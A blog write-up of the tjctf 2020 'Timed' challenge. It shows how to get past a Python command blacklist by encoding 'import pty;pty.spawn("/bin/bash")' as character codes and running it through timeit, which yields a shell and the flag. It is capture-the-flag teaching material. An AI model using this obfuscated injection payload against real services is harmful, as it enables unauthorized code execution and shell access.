<!DOCTYPE html>
<html>

  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="stylesheet" href="/css/main.css">

<!-- Custom stylesheets -->


    <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Timed - tjctf | Cheuk’s Blog</title>
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Timed - tjctf" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="This one is a cool blacklist bypass. It’s pretty simple. You are presented a text interface asking you to enter a python command." />
<meta property="og:description" content="This one is a cool blacklist bypass. It’s pretty simple. You are presented a text interface asking you to enter a python command." />
<meta property="og:site_name" content="Cheuk’s Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-05-26T20:23:00-07:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Timed - tjctf" />
<script type="application/ld+json">
{"headline":"Timed - tjctf","dateModified":"2020-05-26T20:23:00-07:00","datePublished":"2020-05-26T20:23:00-07:00","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup/2020/05/26/timed-tjctf.html"},"description":"This one is a cool blacklist bypass. It’s pretty simple. You are presented a text interface asking you to enter a python command.","@type":"BlogPosting","url":"/writeup/2020/05/26/timed-tjctf.html","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


    
  <head>

  <body>
    <div class="wrapper">
      <nav>
  <a href="/" class="nav-title">
    Cheuk's Blog
  </a>

  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <a class="nav-links" href="/resources/">Resources</a>
  
  
  
  
  
  
  
  
  
  
  
  <a class="nav-links" href="/about/">About</a>
  
  
</nav>

      
      <article class="post">
  <h1 class="title">Timed - tjctf</h1>
  <span>
    <span>
    Tags:
    
    <a href="/tag/ctf">
      ctf
    </a>
    
    <a href="/tag/writeup">
      writeup
    </a>
    
    <a href="/tag/python">
      python
    </a>
    
    </span>
    <span class="meta">26 May 2020</span>
  </span>

  <p>This one is a cool blacklist bypass. It’s pretty simple. You are presented a
text interface asking you to enter a python command.</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Type a command to time it!
</span></code></pre></div></div>

<p>Trying some simple functions seem to work fine, but….</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Type a command to time it!
print(1)
Runtime: 1.09672546387e-05

Type a command to time it!
import os
Hey, no hacking!
</span></code></pre></div></div>

<p>…there seems to be a blacklist of characters that get screened before the
command is run. We must obfuscate it somehow. By digging around, we can see
exactly what is in the blacklist and what isn’t in the blacklist. Most
peculiarly, <code class="language-plaintext highlighter-rouge">timeit</code> is <strong>NOT</strong> in the blacklist.</p>

<blockquote>
  <p>Sidenote: it is hinted that <code class="language-plaintext highlighter-rouge">timeit</code> could be a possibility because it is
visible in the source whenever we provide invalid python code for the program
to execute.</p>
</blockquote>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Type a command to time it!
arst
Traceback (most recent call last):
</span><span class="gp">  File "/timed.py", line 36, in &lt;module&gt;</span><span class="w">
</span><span class="go">    time1=t.timeit(1)
  File "/usr/lib/python2.7/timeit.py", line 202, in timeit
    timing = self.inner(it, self.timer)
</span><span class="gp">  File "&lt;timeit-src&gt;</span><span class="s2">", line 6, in inner
</span><span class="go">    arst
NameError: global name 'arst' is not defined
Runtime: 0

Type a command to time it!
12.,,
Traceback (most recent call last):
</span><span class="gp">  File "/timed.py", line 31, in &lt;module&gt;</span><span class="w">
</span><span class="go">    t=timeit.Timer(res)
  File "/usr/lib/python2.7/timeit.py", line 129, in __init__
    compile(setup + '\n' + stmt, dummy_src_name, "exec")
</span><span class="gp">  File "&lt;timeit-src&gt;</span><span class="s2">", line 2
</span><span class="go">    12.,,
        ^
SyntaxError: invalid syntax
</span></code></pre></div></div>

<p>We can do something like the following in order to trick the program into
executing blacklisted commands:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># We want to execute the following python
</span><span class="n">want_exec</span> <span class="o">=</span> <span class="s">'import pty;pty.spawn("/bin/bash")'</span>
<span class="c1"># So we obfuscate it a bit
</span><span class="n">obfuscated</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">want_exec</span><span class="p">]</span>
<span class="c1"># and we can just reverse it using a join-map
</span><span class="k">assert</span> <span class="n">want_exec</span> <span class="o">==</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="n">obfuscated</span><span class="p">))</span>

<span class="c1"># Payload:
</span><span class="n">timeit</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="p">[</span><span class="mi">105</span><span class="p">,</span> <span class="p">...])))</span>
</code></pre></div></div>

<p>By pasting the payload into the program, we get a shell:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Type a command to time it!
timeit(''.join(map(chr, [105, ...])))
bash: /root/.bashrc: Permission denied
</span><span class="gp">nobody@c51f99923c23:/$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">ls
bin   dev  flag.txt  lib    media  opt   root  sbin  sys       tmp  var
boot  etc  home      lib64  mnt    proc  run   srv   timed.py  usr
</span><span class="gp">nobody@c51f99923c23:/$</span><span class="w"> </span><span class="nb">cat </span>flag.txt
<span class="go">cat flag.txt
tjctf{iTs_T1m3_f0r_a_flaggg}
</span></code></pre></div></div>

</article>

<footer class="post-foot">
  <span class="prev">
  
    <span>Prev</span>
    <a href="/writeup/2020/05/08/gradescope-hw-exploits.html">Taking advantage of output dumping for a Gradescope programming assignment</a>
  
  </span>
  <span class="next">
  
    <span>Next</span>
    <a href="/writeup/2021/04/07/lambda-angstrom2021.html">lambda lambda - angstrom 2021</a>
  
  </span>
</footer>

    </div>
  </body>

</html>
